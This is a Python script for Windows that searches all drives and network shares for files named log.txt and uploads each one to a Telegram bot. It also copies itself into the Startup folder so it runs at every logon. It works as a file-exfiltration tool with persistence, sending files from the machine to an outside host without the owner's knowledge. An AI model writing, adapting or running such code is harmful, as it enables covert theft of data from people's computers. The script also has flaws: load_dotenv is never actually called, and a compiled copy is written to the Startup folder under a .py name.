import os
import sys
import time
import requests
import shutil
import subprocess
import winreg
from dotenv import load_dotenv
from pathlib import Path
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

load_dotenv

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Exact filename to monitor
TARGET_FILENAME = "log.txt"

# Windows drives to monitor
DRIVES = [
    r"C:\\",
    r"D:\\",
    r"E:\\",
    r"F:\\",
    r"Z:\\",                 # Example mapped network drive
]

# Network/UNC folders can also be added here.
# Example:
NETWORK_PATHS = [
    # r"\\SERVER01\Shared",
    # r"\\192.168.1.100\Reports",
]

# Seconds to wait before checking whether a file is completely written
FILE_STABLE_WAIT = 2

# How many times to retry sending a file
MAX_RETRIES = 5

# ============================================================
# TELEGRAM
# ============================================================

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    response = requests.post(
        url,
        data={
            "chat_id": CHAT_ID,
            "text": text
        },
        timeout=30
    )

    response.raise_for_status()


def send_file_to_telegram(file_path, event_type):
    """
    Wait until the file is readable/stable, then upload it.
    """

    file_path = os.path.abspath(file_path)

    # Wait for the file to exist and be stable
    stabilized = False
    for attempt in range(MAX_RETRIES):

        if not os.path.isfile(file_path):
            time.sleep(1)
            continue

        try:
            # Check that the file can be opened
            with open(file_path, "rb"):
                pass

            # Check size
            size1 = os.path.getsize(file_path)

            time.sleep(FILE_STABLE_WAIT)

            size2 = os.path.getsize(file_path)

            # File is probably finished writing
            if size1 == size2:
                stabilized = True
                break

        except (PermissionError, OSError):
            time.sleep(1)

    if not stabilized:
        print(f"File still changing: {file_path}")
        return

    # --------------------------------------------------------
    # Send notification
    # --------------------------------------------------------

    try:
        modified_time = time.strftime(
            "%Y-%m-%d %H:%M:%S",
            time.localtime(os.path.getmtime(file_path))
        )

        message = (
            f"🚨 File {event_type}\n\n"
            f"File: {os.path.basename(file_path)}\n"
            f"Path: {file_path}\n"
            f"Time: {modified_time}"
        )

        send_telegram_message(message)

    except Exception as e:
        print(f"Could not send Telegram message: {e}")
        return

    # --------------------------------------------------------
    # Upload actual file
    # --------------------------------------------------------

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

    for attempt in range(1, MAX_RETRIES + 1):

        try:

            with open(file_path, "rb") as file:

                response = requests.post(
                    url,
                    data={
                        "chat_id": CHAT_ID
                    },
                    files={
                        "document": (
                            os.path.basename(file_path),
                            file
                        )
                    },
                    timeout=120
                )

            response.raise_for_status()

            print(f"Sent to Telegram: {file_path}")
            return

        except Exception as e:

            print(
                f"Upload failed "
                f"(attempt {attempt}/{MAX_RETRIES}): {e}"
            )

            time.sleep(3)

    print(f"Failed to send file: {file_path}")


# ============================================================
# FILE MONITOR
# ============================================================

class FileMonitor(FileSystemEventHandler):

    def __init__(self):
        self.last_event_time = {}

    def check_file(self, file_path, event_type):

        try:

            filename = os.path.basename(file_path)

            if filename.lower() != TARGET_FILENAME.lower():
                return

            current_time = time.time()
            last_time = self.last_event_time.get(file_path, 0)

            # Debounce: ignore if event fired within 3 seconds
            if current_time - last_time < 3:
                print(f"  Debounced {event_type} for {file_path}")
                return

            self.last_event_time[file_path] = current_time

            print(
                f"\nDetected {event_type}: "
                f"{file_path}"
            )

            send_file_to_telegram(
                file_path,
                event_type
            )

        except Exception as e:

            print(f"Monitor error: {e}")

    def on_created(self, event):

        if event.is_directory:
            return

        self.check_file(
            event.src_path,
            "CREATED"
        )

    def on_modified(self, event):

        if event.is_directory:
            return

        self.check_file(
            event.src_path,
            "MODIFIED"
        )


# ============================================================
# START MONITORING
# ============================================================

def start_monitoring():

    event_handler = FileMonitor()

    observers = []

    locations = DRIVES + NETWORK_PATHS

    for location in locations:

        if not os.path.exists(location):
            print(f"Not accessible: {location}")
            continue

        print(f"Monitoring: {location}")

        observer = Observer()

        observer.schedule(
            event_handler,
            location,
            recursive=True
        )

        observer.start()

        observers.append(observer)

    if not observers:
        print("No locations could be monitored.")
        return

    print("\n" + "=" * 60)
    print("MONITORING IS RUNNING")
    print(f"Looking for: {TARGET_FILENAME}")
    print("Press CTRL+C to stop.")
    print("=" * 60)

    try:

        while True:
            time.sleep(1)

    except KeyboardInterrupt:

        print("\nStopping...")

        for observer in observers:
            observer.stop()

        for observer in observers:
            observer.join()

        print("Stopped.")


# ============================================================
# SELF-COPY AND DELETION FOR .EXE
# ============================================================

def get_script_path():
    """Get the path of the running script or executable."""
    if getattr(sys, 'frozen', False):
        # Running as compiled .exe
        return os.path.abspath(sys.executable)
    else:
        # Running as .py script
        return os.path.abspath(__file__)


def self_copy_to_startup():
    """Copy this script to Windows startup folder if not already there."""
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )
    if not startup_dir:
        return

    script_path = get_script_path()
    is_frozen = getattr(sys, 'frozen', False)

    if is_frozen:
        # For .exe: copy as .py file
        target = os.path.join(startup_dir, "file_detect.py")
        base_name = "file_detect.py"
    else:
        # For .py: copy as .py file
        target = os.path.join(startup_dir, "file_detect.py")
        base_name = "file_detect.py"

    # Avoid re-copying if already in startup
    if os.path.exists(script_path) and os.path.exists(target):
        if os.path.abspath(script_path) == os.path.abspath(target):
            return

    try:
        shutil.copy2(script_path, target)
        print(f"Copied to startup: {target}")
    except Exception as e:
        print(f"Self-copy failed: {e}")
        return False
    return True


def main_installation():
    """Set up self-copy and start monitoring."""
    # Copy to startup
    self_copy_to_startup()
    # Start monitoring immediately for .py
    start_monitoring()


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    main_installation()